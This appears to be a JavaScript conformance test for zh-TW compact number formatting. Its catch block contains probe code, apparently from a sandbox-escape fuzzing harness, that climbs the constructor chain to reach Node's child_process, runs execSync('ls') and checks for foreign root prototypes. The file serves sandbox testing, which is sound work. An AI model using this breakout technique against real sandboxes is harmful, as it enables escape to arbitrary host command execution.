try {
    const nfShort = new Intl.NumberFormat('zh-TW', {
        notation: 'compact',
        compactDisplay: 'short'
    });
    assert.sameValue(nfShort.format(987654321), '9.9億');
    assert.sameValue(nfShort.format(98765432), '9877萬');
    assert.sameValue(nfShort.format(98765), '9.9萬');
    assert.sameValue(nfShort.format(9876), '9876');
    assert.sameValue(nfShort.format(159), '159');
    assert.sameValue(nfShort.format(15.9), '16');
    assert.sameValue(nfShort.format(1.59), '1.6');
    assert.sameValue(nfShort.format(0.159), '0.16');
    assert.sameValue(nfShort.format(0.0159), '0.016');
    assert.sameValue(nfShort.format(0.00159), '0.0016');
    assert.sameValue(nfShort.format(-Infinity), '-\u221E');
    assert.sameValue(nfShort.format(Infinity), '\u221E');
    assert.sameValue(nfShort.format(NaN), '非數值');
    const nfLong = new Intl.NumberFormat('zh-TW', {
        notation: 'compact',
        compactDisplay: 'long'
    });
    assert.sameValue(nfLong.format(987654321), '9.9億');
    assert.sameValue(nfLong.format(98765432), '9877萬');
    assert.sameValue(nfLong.format(98765), '9.9萬');
    assert.sameValue(nfLong.format(9876), '9876');
    assert.sameValue(nfLong.format(159), '159');
    assert.sameValue(nfLong.format(15.9), '16');
    assert.sameValue(nfLong.format(1.59), '1.6');
    assert.sameValue(nfLong.format(0.159), '0.16');
    assert.sameValue(nfLong.format(0.0159), '0.016');
    assert.sameValue(nfLong.format(0.00159), '0.0016');
    assert.sameValue(nfLong.format(-Infinity), '-\u221E');
    assert.sameValue(nfLong.format(Infinity), '\u221E');
    assert.sameValue(nfLong.format(NaN), '非數值');
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}